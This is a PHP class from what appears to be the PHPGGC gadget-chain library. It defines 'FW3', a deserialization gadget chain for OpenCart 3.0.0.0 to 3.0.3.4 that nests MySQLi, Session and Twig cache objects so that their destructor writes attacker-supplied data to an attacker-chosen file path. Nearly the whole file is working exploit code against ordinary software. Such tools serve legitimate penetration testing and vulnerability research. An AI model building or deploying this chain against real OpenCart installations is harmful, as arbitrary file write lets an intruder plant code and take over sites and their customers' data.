<?php

namespace GadgetChain\OpenCart;

class FW3 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '3.0.0.0 <= 3.0.3.4';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'The gadget chain is documented here: https://seclists.org/fulldisclosure/2022/May/30';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \DB\MySQLi(
            new \Session(
                new \Twig_Cache_Filesystem(),
                $path,
                $data
            )
        );
    }
}
